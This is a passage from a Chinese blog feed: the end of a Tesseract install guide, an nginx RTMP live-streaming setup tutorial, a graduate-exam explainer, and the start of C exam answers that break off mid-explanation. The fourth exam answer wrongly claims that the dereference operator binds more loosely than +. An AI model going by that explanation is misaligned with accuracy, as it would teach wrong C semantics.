class="line">ls</span><br></pre></td></tr></table></figure><p> <img src="/posts/c417f07b/2020-07-29-23-19-53.png" alt="tessdata目录"><br> <strong>重复第7，8步骤，直到进入tessdata目录下</strong></p></li><li><p>打印当前工作目录，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p> <img src="/posts/c417f07b/2020-07-29-23-22-05.png" alt="pwd"><br> <strong>记住打印出来的结果<code>/usr/share/tesseract/4/tessdata</code></strong></p></li><li><p>接下来的步骤和ubantu安装步骤的第7步往下是一模一样的了</p></li></ol><h1 id="其他操作系统"><a href="#其他操作系统" class="headerlink" title="其他操作系统"></a>其他操作系统</h1><p>请参考<a href="https://tesseract-ocr.github.io/tessdoc/Home.html" target="_blank" rel="noopener">官方文档</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ubantu&quot;&gt;&lt;a href=&quot;#ubantu&quot; class=&quot;headerlink&quot; title=&quot;ubantu&quot;&gt;&lt;/a&gt;ubantu&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;使用命令&lt;code&gt;sudo apt install tesseract-ocr&lt;/code&gt;安
      
    
    </summary>
    
      <category term="linux" scheme="https://blog.zimo.wiki/categories/linux/"/>
    
      <category term="ubantu" scheme="https://blog.zimo.wiki/categories/linux/ubantu/"/>
    
    
      <category term="linux" scheme="https://blog.zimo.wiki/tags/linux/"/>
    
      <category term="tesseract-ocr" scheme="https://blog.zimo.wiki/tags/tesseract-ocr/"/>
    
      <category term="ubantu" scheme="https://blog.zimo.wiki/tags/ubantu/"/>
    
      <category term="centos" scheme="https://blog.zimo.wiki/tags/centos/"/>
    
  </entry>
  
  <entry>
    <title>nginx搭建直播服务器</title>
    <link href="https://blog.zimo.wiki/posts/7a7901bf/"/>
    <id>https://blog.zimo.wiki/posts/7a7901bf/</id>
    <published>2020-05-05T05:57:27.000Z</published>
    <updated>2022-05-04T02:56:01.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux下nginx源码安装并关联rtmp模块"><a href="#Linux下nginx源码安装并关联rtmp模块" class="headerlink" title="Linux下nginx源码安装并关联rtmp模块"></a>Linux下nginx源码安装并关联rtmp模块</h2><ol><li><p>卸载原有的nginx</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove nginx</span><br></pre></td></tr></table></figure></li><li><p>下载nginx源码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.15.3.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压源码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf nginx-1.15.3.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>下载nginx rtmp模块</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/arut/nginx-rtmp-module/archive/v1.2.1.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压rtmp模块</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf v1.2.1.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>安装编译nginx所需要的库</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install build-essential libpcre3 libpcre3-dev libssl-dev -y</span><br></pre></td></tr></table></figure></li><li><p>进入nginx的解压目录</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd nginx-1.15.3/</span><br></pre></td></tr></table></figure></li><li><p>关联rtmp模块</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=./bin --add-module=../nginx-rtmp-module-1.2.1</span><br></pre></td></tr></table></figure></li><li><p>编译安装</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></li><li><p>启动nginx，查看效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/sbin/nginx</span><br></pre></td></tr></table></figure></li></ol><h2 id="Linux下配置上一步安装好的nginx"><a href="#Linux下配置上一步安装好的nginx" class="headerlink" title="Linux下配置上一步安装好的nginx"></a>Linux下配置上一步安装好的nginx</h2><ol><li><p>编辑nginx配置文件</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim bin/conf/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>根结点下新增rtmp配置，如下</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rtmp &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 1935;</span><br><span class="line">        chunk_size 4000;</span><br><span class="line">        application live &#123;</span><br><span class="line">            live on;</span><br><span class="line">            record off;</span><br><span class="line">            allow play all;</span><br><span class="line">            max_connections 1024;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>保存后，重启nginx服务</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/sbin/nginx -s reload</span><br></pre></td></tr></table></figure></li></ol><h2 id="windows下安装FFmpeg，用来推流"><a href="#windows下安装FFmpeg，用来推流" class="headerlink" title="windows下安装FFmpeg，用来推流"></a>windows下安装FFmpeg，用来推流</h2><ol><li>访问<code>https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-latest-win64-static.zip</code>，下载最新版FFmpeg</li><li>解压到相关目录<br><img src="/posts/7a7901bf/2020-05-05-16-48-56.png" alt></li></ol><h2 id="Windows下使用FFmpeg进行推流测试"><a href="#Windows下使用FFmpeg进行推流测试" class="headerlink" title="Windows下使用FFmpeg进行推流测试"></a>Windows下使用FFmpeg进行推流测试</h2><ol><li><p>在上图中，框起来的地方输入cmd，按<kbd>enter</kbd></p></li><li><p>推流，[host]换成你的服务器地址，[port]换成你的nginx监听rtmp协议的端口</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg.exe -i 1.mp4 -f flv rtmp://[host]:[port]/live/room</span><br></pre></td></tr></table></figure><p> <img src="/posts/7a7901bf/2020-05-05-16-56-13.png" alt></p></li></ol><h2 id="Windows下使用支持rtmp协议的播放器测试"><a href="#Windows下使用支持rtmp协议的播放器测试" class="headerlink" title="Windows下使用支持rtmp协议的播放器测试"></a>Windows下使用支持rtmp协议的播放器测试</h2><ol><li>以爱奇艺万能视频播放器举例</li><li>选择在线播放，输入地址<code>rtmp://[host]:[port]/live/room</code>，地址保证和你上面推流的地址相同即可<br> <img src="/posts/7a7901bf/2020-05-05-16-58-19.png" alt></li><li>成功<br> <img src="/posts/7a7901bf/2020-05-05-17-01-16.png" alt></li></ol><h2 id="附上一个使用video-js播放rtmp直播流视频的demo"><a href="#附上一个使用video-js播放rtmp直播流视频的demo" class="headerlink" title="附上一个使用video.js播放rtmp直播流视频的demo"></a>附上一个使用video.js播放rtmp直播流视频的demo</h2><ol><li><p>注意：需要在服务器上运行，可以是本地服务器，不能直接使用浏览器打开</p></li><li><p>demo代码</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Player<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/video.js/dist/video-js.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">"video"</span> <span class="attr">class</span>=<span class="string">"video-js vjs-default-skin"</span> <span class="attr">controls</span> <span class="attr">autoplay</span>=<span class="string">"autoplay"</span> <span class="attr">width</span>=<span class="string">"640"</span> <span class="attr">height</span>=<span class="string">"320"</span> <span class="attr">data-setup</span>=<span class="string">'&#123;&#125;'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"rtmp://www.zimo.wiki/live/room"</span> <span class="attr">type</span>=<span class="string">"rtmp/flv"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/video.js/dist/video.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/videojs-flash@2/dist/videojs-flash.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>效果<br><img src="/posts/7a7901bf/2020-05-05-17-16-12.png" alt></p></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux下nginx源码安装并关联rtmp模块&quot;&gt;&lt;a href=&quot;#Linux下nginx源码安装并关联rtmp模块&quot; class=&quot;headerlink&quot; title=&quot;Linux下nginx源码安装并关联rtmp模块&quot;&gt;&lt;/a&gt;Linux下nginx源码安
      
    
    </summary>
    
      <category term="linux" scheme="https://blog.zimo.wiki/categories/linux/"/>
    
      <category term="nginx" scheme="https://blog.zimo.wiki/categories/linux/nginx/"/>
    
    
      <category term="nginx" scheme="https://blog.zimo.wiki/tags/nginx/"/>
    
      <category term="linux" scheme="https://blog.zimo.wiki/tags/linux/"/>
    
      <category term="直播服务器" scheme="https://blog.zimo.wiki/tags/%E7%9B%B4%E6%92%AD%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>科普文——考研须知</title>
    <link href="https://blog.zimo.wiki/posts/27a372c3/"/>
    <id>https://blog.zimo.wiki/posts/27a372c3/</id>
    <published>2020-01-01T11:20:47.000Z</published>
    <updated>2022-05-04T02:56:01.466Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;最近不少同学向博主问起关于考研的一些问题，博主觉得这些问题可能是每个想考研的同学都会遇到的，比较有代表性，于是博主写下这篇文章在这里做一下统一的解答，同时也希望能对各位同学做出考研规划起到一定的帮助作用。博主将通过这篇文章向大家系统性的介绍一下考研。</p></blockquote><h2 id="关于硕士研究生的一些概念"><a href="#关于硕士研究生的一些概念" class="headerlink" title="关于硕士研究生的一些概念"></a>关于硕士研究生的一些概念</h2><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;中国实行的硕士研究生学位教育主要分为：学术型学位（学术理论研究）和专业型学位（注重操作实际能力）两种教育并轨，但一直以来，更<strong>偏重</strong>学术型学位教育，而少注重专业型学位教育，所以这导致了很多学术型学位研究生毕业后，只能大谈阔论，能理论能研究，但操作能力（<strong>这里其实很相对，毕竟学术能到这个阶段的人，只要不造假之类的，一般都不会太差，再弱也比很多本科生强</strong>）差。因此为了能与国际硕士研究生学位教育接轨，增加了专业型研究生教育。</p></blockquote><h3 id="学硕"><a href="#学硕" class="headerlink" title="学硕"></a>学硕</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;学硕的全称是学术性硕士，顾名思义也就是注重学术方面研究的硕士研究生，再通俗一些就是学校以课本理论为主进行的人才培养。至于实践方面，可以说是辅助，而理论研究一定是被放在首要位置进行的培养内容。学术型硕士主要是为专业领域培养研究人员或者是为高校输送人才等。</p></blockquote><h3 id="专硕"><a href="#专硕" class="headerlink" title="专硕"></a>专硕</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;专硕的全称是专业型硕士，与学硕进行对比就是重实践，轻理论。当然，这都是相对而言的，轻理论并不是完全忽视理论，而是与实践对比的情况下，学校会在实践方面花费大量的时间对学生进行培养，课本理论只是辅助，不作为重点培养方向。由此可见，专硕更像是为社会的各企业单位培养人才。</p></blockquote><h3 id="学硕和专硕的区别"><a href="#学硕和专硕的区别" class="headerlink" title="学硕和专硕的区别"></a>学硕和专硕的区别</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;专业型硕士学制一般为两年（但有的学校专硕也是三年），目的是为了培养一些应用型人才，培养方向更加注重实践操作，是为了给某个特定的职业培养掌握专业技能的和的高层次的人才，一般是想要在某个特定职业领域深入学习的人选择的学位。而学术型硕士的学制一般为三年（其实也有两年的，具体院校不同培养方案不同），主要是为了培养科学研究型人才，培养方向侧重理论教育，学术型硕士的就职方向多为大学教师和科研机构人员。<br>&nbsp;&nbsp;&nbsp;&nbsp;另外二者的学费也不同，一般而言专业型硕士的学费要比学术型硕士高一些。</p></blockquote><h3 id="博主建议"><a href="#博主建议" class="headerlink" title="博主建议"></a>博主建议</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;读完硕士阶段就准备找工作的同学读专业型硕士更有帮助，而学术型硕士对打算继续读博士的人更好。</p></blockquote><h3 id="相关问题——学硕专硕到底哪个更好？"><a href="#相关问题——学硕专硕到底哪个更好？" class="headerlink" title="相关问题——学硕专硕到底哪个更好？"></a>相关问题——学硕专硕到底哪个更好？</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;肯定还有一部分同学还是不能做出选择，就只想问一句——“学硕和专硕哪个更好？”。其实就实际而言，针对当今的社会的就业环境而言，并不是读学硕出来的同学就必须当科研人员，高校教师或者继续读博，专硕的同学就必须到公司工作，而不能搞研究，读博之类的，毕竟事无绝对。二者实际上没有那么绝对的限制，并且本身二者也就没有什么高低好坏，所以大家不应该去问学硕、专硕哪个更好，而应该把关注点放在自己的偏好和能力上，找到适合自己的方向就是最好的。<br>&nbsp;&nbsp;&nbsp;&nbsp;所以最后的结论是，适合自己的才是最好的。</p></blockquote><h2 id="关于考研目标院校的一些概念"><a href="#关于考研目标院校的一些概念" class="headerlink" title="关于考研目标院校的一些概念"></a>关于考研目标院校的一些概念</h2><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;根据报考目标院校学科建设情况的不同，分为五类院校，由好到差分别是：985院校、211院校、双一流院校、双一流学科院校、一般院校。</p></blockquote><h3 id="985院校"><a href="#985院校" class="headerlink" title="985院校"></a>985院校</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;985相信大家都听说过，这里不做过多概述，反正这个是最好的目标院校，但是最好也就意味着考上的难度最大。</p></blockquote><h3 id="211院校"><a href="#211院校" class="headerlink" title="211院校"></a>211院校</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;211相信大家也都听说过，这里不做过多概述。</p></blockquote><h3 id="双一流院校"><a href="#双一流院校" class="headerlink" title="双一流院校"></a>双一流院校</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;双一流院校是指学校的综合实力（几乎所有专业学科）达到了双一流的水平。</p></blockquote><h3 id="双一流学科院校"><a href="#双一流学科院校" class="headerlink" title="双一流学科院校"></a>双一流学科院校</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;双一流学科院校是指学校的某（几）个学科达到了双一流的水平（有可能这个学科在全国排名都是靠前的，比如成都理工大学，地质科学专业全国第一，甚至连北大和清华都比不上，没什么好说的，毕竟著名地质学家，李xx就是成都理工大学毕业的）。注意区分双一流院校和双一流学科院校的区别。</p></blockquote><h3 id="一般院校"><a href="#一般院校" class="headerlink" title="一般院校"></a>一般院校</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;相对来说是最差的院校（尽管是最差的，也比二本院校强很多了，毕竟很多二本压根都没有研究生招生资格的），但是同时也代表着最容易考上。</p></blockquote><h2 id="关于考研的一些概念"><a href="#关于考研的一些概念" class="headerlink" title="关于考研的一些概念"></a>关于考研的一些概念</h2><h3 id="考研是什么"><a href="#考研是什么" class="headerlink" title="考研是什么"></a>考研是什么</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;全国硕士研究生统一招生考试（Unified National Graduate Entrance Examination），简称“考研”。是教育主管部门和招生机构为选拔研究生而组织的相关考试的总称，是<strong>国家统考规格最高的考试</strong>（这里其实大家可能会有疑问，考研就最高了？那考博呢？需注意，考博已经不是全国统考了），跟高考一样，每年考一次。</p></blockquote><h3 id="考研包括哪些阶段"><a href="#考研包括哪些阶段" class="headerlink" title="考研包括哪些阶段"></a>考研包括哪些阶段</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;一般来说分为初试和复试两个阶段，初试时间一般在每年倒数第二个周末（一般来说大概在12月21号左右），复试时间根据报考单位的不同而有所不同（大部分是在3月中旬到5月初）。</p></blockquote><h3 id="考研初试科目和分数组成"><a href="#考研初试科目和分数组成" class="headerlink" title="考研初试科目和分数组成"></a>考研初试科目和分数组成</h3><blockquote><p>政治：100分<br>英语：100分<br>数学或专业基础：150分<br>专业课：150分<br>总分：500分</p></blockquote><h3 id="考研初试科目考试范围和考试方式"><a href="#考研初试科目考试范围和考试方式" class="headerlink" title="考研初试科目考试范围和考试方式"></a>考研初试科目考试范围和考试方式</h3><h4 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h4><blockquote><ol><li>考试方式：全国统考</li><li>考试范围：大学期间的所有思想政治课程公选课和时政（形势与政策），分别是：《思修》、《近代史》、《毛概》、《马原》、《当代时政》</li></ol></blockquote><h4 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;根据报考硕士类别的不同一般会有英语一和英语二的差别，一般学硕考英语一，专硕考英语二，难度英语一大于英语二，考试方式为全国统考。</p></blockquote><h4 id="数学或专业基础"><a href="#数学或专业基础" class="headerlink" title="数学或专业基础"></a>数学或专业基础</h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;数学分为数学一，数学二、数学三（只有经管专业考生考）。考试方式为全国统考。一般来说学硕考数学一，专硕考数学二，但也有部分院校考自命题（可能是数学自命题，可能是专业自命题，这个就属于专业基础的范围了），也有部分学校专硕也考数一，也有部分学校学硕也考数二，具体院校具体分析。<br>数学一考试范围：《高等数学上、下》、《线性代数》、《概率论与数理统计》<br>数学二考试范围：《高等数学上、下》（部分内容不考，如级数，三重积分等）、《线性代数》<br>数学三考试范围：大部分同数一<br>总结：数学一考的<strong>内容最多</strong>，数学二考的最少，但是<strong>考得最深（高数部分）</strong>，而数学三的侧重点在于实际应用。</p></blockquote><h4 id="专业课"><a href="#专业课" class="headerlink" title="专业课"></a>专业课</h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;根据报考学校报考专业的不同而有所不同。一般来说，报考985/211的计算机专业是统考408。<br>408考试范围：《数据结构》、《操作系统》、《计算机网络原理》、《计算机组成原理》</p></blockquote><h3 id="考研复试"><a href="#考研复试" class="headerlink" title="考研复试"></a>考研复试</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;复试是研究生考试制度的重要组成部分，即通过研究生入学考试（初试）后参加的，由报考院校组织进行的第二次考试。一般也分笔试和面试。早期的研究生复试多只是一种形式，但从引2006年起研究生招生加大了复试的权重，有的招生单位甚至把复试的权重加大至百分之五十，这就要求考生具有真才实学并具备更高的应变能力。<strong>复试考查范围极广。既有类似企业入职前的面试、笔试等阶段，又有英语口语的展示阶段。</strong></p></blockquote><h2 id="关于考研的一些常见问题"><a href="#关于考研的一些常见问题" class="headerlink" title="关于考研的一些常见问题"></a>关于考研的一些常见问题</h2><h3 id="考研的信息从哪里获取？"><a href="#考研的信息从哪里获取？" class="headerlink" title="考研的信息从哪里获取？"></a>考研的信息从哪里获取？</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;唯一官方网站<a href="https://yz.chsi.com.cn/" target="_blank" rel="noopener">研招网</a></p></blockquote><h3 id="怎么选择报考学校？"><a href="#怎么选择报考学校？" class="headerlink" title="怎么选择报考学校？"></a>怎么选择报考学校？</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;根据个人情况和个人兴趣爱好去报考学校和专业。</p></blockquote><h3 id="考研应该从什么时候开始准备？"><a href="#考研应该从什么时候开始准备？" class="headerlink" title="考研应该从什么时候开始准备？"></a>考研应该从什么时候开始准备？</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你志向远大，想考很好的学校，那么你就应该早做准备（最好从大一大二就开始）；如果你徘徊不定，犹豫不决，最晚你大四的时候就应该开始准备了，不过到了那个时候，你选择的学校一般不会太好，因为复习的时间不是特别充足。这个还得具体情况具体分析。</p></blockquote><h3 id="考研需要报班吗？"><a href="#考研需要报班吗？" class="headerlink" title="考研需要报班吗？"></a>考研需要报班吗？</h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你是一个极其自律的人，那么你不需要报班；另一方面，如果你自认为不是自律的人的话，你可以报班，不过你得接受高额的费用。</p></blockquote><h3 id="考研应该怎么准备？"><a href="#考研应该怎么准备？" class="headerlink" title="考研应该怎么准备？"></a>考研应该怎么准备？</h3><blockquote><ol><li>确定目标院校，目标专业</li><li>确定学硕，专硕</li><li>确定考试科目</li><li>确定复习策略</li><li>持续努力，尽管大家都懂要想成功必须坚持努力这些道理，但其实能不能坚持下去真的得打上一个大大的问号？</li></ol></blockquote><h3 id="如有其它问题，欢迎联系博主或者直接留言，本文会及时更新"><a href="#如有其它问题，欢迎联系博主或者直接留言，本文会及时更新" class="headerlink" title="如有其它问题，欢迎联系博主或者直接留言，本文会及时更新"></a>如有其它问题，欢迎联系博主或者直接留言，本文会及时更新</h3><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><ol><li><a href="https://baike.baidu.com/item/%E5%85%A8%E5%9B%BD%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BB%9F%E4%B8%80%E6%8B%9B%E7%94%9F%E8%80%83%E8%AF%95/20562930?fromtitle=%E8%80%83%E7%A0%94&fromid=140392&fr=aladdin" target="_blank" rel="noopener">全国硕士研究生统一招生考试</a></li><li><a href="https://baijiahao.baidu.com/s?id=1640034501298737943&wfr=spider&for=pc" target="_blank" rel="noopener">考研学硕和专硕究竟有哪些区别？差别很大！</a></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近不少同学向博主问起关于考研的一些问题，博主觉得这些问题可能是每
      
    
    </summary>
    
      <category term="考研" scheme="https://blog.zimo.wiki/categories/%E8%80%83%E7%A0%94/"/>
    
    
      <category term="考研" scheme="https://blog.zimo.wiki/tags/%E8%80%83%E7%A0%94/"/>
    
      <category term="科普" scheme="https://blog.zimo.wiki/tags/%E7%A7%91%E6%99%AE/"/>
    
      <category term="常识" scheme="https://blog.zimo.wiki/tags/%E5%B8%B8%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>成信大807程序综合设计2019年真题答案以及解析</title>
    <link href="https://blog.zimo.wiki/posts/28b181d9/"/>
    <id>https://blog.zimo.wiki/posts/28b181d9/</id>
    <published>2019-11-19T12:50:25.000Z</published>
    <updated>2022-05-04T02:56:01.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单项选择题"><a href="#单项选择题" class="headerlink" title="单项选择题"></a>单项选择题</h2><ol><li><p>C语言编译程序的首要工作是<br>A. 检查C程序的完整性<br>B. 检查C程序的逻辑错误<br>C. 检查C程序的语法错误<br>D. 生成目标文件<br>答案：<code>C</code><br>解析：C语言编译程序的首要工作就是检查C语言程序中是否存在语法错误,如果有则给出错误的提示信息，如果没有则生成对应的目标文件(.obj)</p></li><li><p>能正确表示a和b同时为正或同时为负的逻辑表达式是<br>A. (a&gt;=O||b&gt;=O)&amp;&amp;(a&lt;0||b&lt;0)<br>B. (a&gt;=0&amp;&amp;b&gt;=0)&amp;&amp;(a&lt;0&amp;&amp;b&lt;0)<br>C. (a+b&gt;0)&amp;&amp;(a+b&lt;=0)<br>D. a*b&gt;0<br>答案：<code>D</code><br>解析：D选项可由乘法运算法则得到；其他选项可以举反例，A选项反例是a = 1,b = -1，结果为真；B选项永远为假；C选项同样永远为假</p></li><li><p>下面程序运行后的输出结果是</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">3.14</span>;</span><br><span class="line">    a = fun(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> A. 3.00<br> B. 3.14<br> C. 3<br> D. 0<br> 答案：<code>A</code><br> 解析：函数参数类型以形参为准，在主函数调用fun函数的时候，传递的a是3.14，然后到了fun中就被强制转换为了整型数3，然后这个返回值又赋值到了a中，于是此时a中的值是浮点数3.0000（不精确的一个很接近3的小数值，浮点数都有误差），这里有一次自动类型转换，所以最后输出的结果是3.00</p></li><li><p>下面程序段执行后，a的值为<br><code>static int s[2][4] = {0,1,2,3,4,5,6,7};</code><br><code>int a,*p;</code><br><code>p = &amp;s[0][1];// p指向了值为1的位置</code><br><code>a = (*p)*(*p+3)*(*p+5);</code><br>A. 28<br>B. 15<br>C. 24<br>D. 不确定<br>答案：<code>C</code><br>解析：<em>作为取值运算符时，优先级较低，所以会先进行p+3的运算，然后再取值，p指向1的位置，p+3指向4的位置，所以\</em>(p + 